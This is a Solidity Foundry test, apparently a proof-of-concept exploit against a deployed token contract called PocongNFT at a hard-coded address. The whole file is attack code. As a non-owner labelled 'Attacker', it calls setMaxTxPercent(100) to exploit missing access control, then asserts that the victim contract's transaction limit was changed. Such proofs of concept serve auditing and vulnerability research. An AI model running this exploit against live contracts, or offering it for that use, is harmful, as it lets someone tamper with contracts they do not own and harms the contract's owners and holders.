pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IPocongNFT {
    function owner() external view returns (address);
    function _maxTxAmount() external view returns (uint256);
    function _maxWalletToken() external view returns (uint256);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function setMaxWalletPercent(uint256 maxWalletPercent) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);
    IPocongNFT target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IPocongNFT(TARGET);
        vm.label(TARGET, "PocongNFT Victim Contract");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Verify we're not the owner (precondition)
        address owner = target.owner();
        require(owner != attacker, "Attacker should not be owner");

        // Record original _maxTxAmount
        uint256 originalMaxTx = target._maxTxAmount();
        console.log("Original _maxTxAmount:", originalMaxTx);

        // Exploit: Call setMaxTxPercent as non-owner (missing access control)
        target.setMaxTxPercent(100); // Set to 100%

        // Verify _maxTxAmount has changed
        uint256 newMaxTx = target._maxTxAmount();
        console.log("New _maxTxAmount:", newMaxTx);

        // Oracle check: _maxTxAmount should NOT equal original value
        assertGt(newMaxTx, 0, "_maxTxAmount should be modified");
        assertTrue(newMaxTx != originalMaxTx, "_maxTxAmount was not modified - exploit failed");
        assertTrue(newMaxTx != 15000000000000000, "Logic Exploit Failed: Value unchanged");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

